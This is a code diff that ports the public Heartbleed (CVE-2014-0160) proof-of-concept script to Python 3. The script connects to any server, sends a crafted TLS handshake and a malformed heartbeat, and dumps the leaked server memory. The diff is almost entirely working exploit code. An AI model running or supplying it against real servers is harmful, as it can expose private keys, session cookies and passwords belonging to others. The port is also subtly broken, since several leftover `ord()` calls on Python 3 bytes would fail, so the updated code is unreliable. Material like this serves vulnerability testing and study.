@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 
 # Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)
 # The author disclaims copyright to this source code.
@@ -15,7 +15,7 @@ options = OptionParser(usage='%prog server [options]', description='Test for SSL
 options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')
 
 def h2bin(x):
-    return x.replace(' ', '').replace('\n', '').decode('hex')
+    return bytes.fromhex(x.replace(' ', '').replace('\n', ''))
 
 hello = h2bin('''
 16 03 02 00  dc 01 00 00 d8 03 02 53
@@ -41,12 +41,12 @@ hb = h2bin('''
 ''')
 
 def hexdump(s):
-    for b in xrange(0, len(s), 16):
+    for b in range(0, len(s), 16):
         lin = [c for c in s[b : b + 16]]
         hxdat = ' '.join('%02X' % ord(c) for c in lin)
         pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)
-        print '  %04x: %-48s %s' % (b, hxdat, pdat)
-    print
+        print('  %04x: %-48s %s' % (b, hxdat, pdat))
+    print()
 
 def recvall(s, length, timeout=5):
     endtime = time.time() + timeout
@@ -70,14 +70,14 @@ def recvall(s, length, timeout=5):
 def recvmsg(s):
     hdr = recvall(s, 5)
     if hdr is None:
-        print 'Unexpected EOF receiving record header - server closed connection'
+        print('Unexpected EOF receiving record header - server closed connection')
         return None, None, None
     typ, ver, ln = struct.unpack('>BHH', hdr)
     pay = recvall(s, ln, 10)
     if pay is None:
-        print 'Unexpected EOF receiving record payload - server closed connection'
+        print('Unexpected EOF receiving record payload - server closed connection')
         return None, None, None
-    print ' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay))
+    print(' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay)))
     return typ, ver, pay
 
 def hit_hb(s):
@@ -85,22 +85,22 @@ def hit_hb(s):
     while True:
         typ, ver, pay = recvmsg(s)
         if typ is None:
-            print 'No heartbeat response received, server likely not vulnerable'
+            print('No heartbeat response received, server likely not vulnerable')
             return False
 
         if typ == 24:
-            print 'Received heartbeat response:'
+            print('Received heartbeat response:')
             hexdump(pay)
             if len(pay) > 3:
-                print 'WARNING: server returned more data than it should - server is vulnerable!'
+                print('WARNING: server returned more data than it should - server is vulnerable!')
             else:
-                print 'Server processed malformed heartbeat, but did not return any extra data.'
+                print('Server processed malformed heartbeat, but did not return any extra data.')
             return True
 
         if typ == 21:
-            print 'Received alert:'
+            print('Received alert:')
             hexdump(pay)
-            print 'Server returned error, likely not vulnerable'
+            print('Server returned error, likely not vulnerable')
             return False
 
 def main():
@@ -110,24 +110,24 @@ def main():
         return
 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    print 'Connecting...'
+    print('Connecting...')
     sys.stdout.flush()
     s.connect((args[0], opts.port))
-    print 'Sending Client Hello...'
+    print('Sending Client Hello...')
     sys.stdout.flush()
     s.send(hello)
-    print 'Waiting for Server Hello...'
+    print('Waiting for Server Hello...')
     sys.stdout.flush()
     while True:
         typ, ver, pay = recvmsg(s)
         if typ == None:
-            print 'Server closed connection without sending Server Hello.'
+            print('Server closed connection without sending Server Hello.')
             return
         # Look for server hello done message.
         if typ == 22 and ord(pay[0]) == 0x0E:
             break
 
-    print 'Sending heartbeat request...'
+    print('Sending heartbeat request...')
     sys.stdout.flush()
     s.send(hb)
     hit_hb(s)
